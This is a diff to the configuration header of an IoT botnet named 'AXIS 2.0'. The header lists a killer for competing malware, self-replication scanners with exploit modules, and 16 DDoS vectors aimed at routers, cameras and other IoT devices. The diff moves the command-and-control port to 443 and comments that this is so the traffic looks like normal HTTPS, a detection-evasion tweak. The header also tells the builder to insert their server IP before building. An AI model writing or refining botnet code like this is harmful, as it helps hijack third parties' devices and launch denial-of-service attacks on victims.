@@ -2,12 +2,12 @@
  * AXIS 2.0 Botnet - Unified Configuration Header
  * ============================================================================
  * CRITICAL: Change all 0.0.0.0 placeholders to your server IP before building!
- * 
+ *
  * Features:
  * - KILLER: Anti-malware killer (eliminates competing botnets)
- * - SELFREP: Self-replication scanners (13 exploit modules)
+ * - SELFREP: Self-replication scanners (23 unique exploit modules)
  * - WATCHDOG: Hardware watchdog maintenance
- * 
+ *
  * Attack Methods: 16 optimized L4/L7 DDoS vectors
  * Scanner Targets: Global IoT devices, routers, cameras
  * ============================================================================
@@ -23,7 +23,7 @@
 // C&C Server address (IP or domain)
 // CHANGE THIS: 0.0.0.0 is placeholder - set to your C&C server IP
 #define CNC_ADDR "0.0.0.0"
-#define CNC_PORT 3778
+#define CNC_PORT 443  // Standard HTTPS port (looks like normal HTTPS traffic)
 
 // Scan results callback
 #define SCAN_CB_PORT 9555
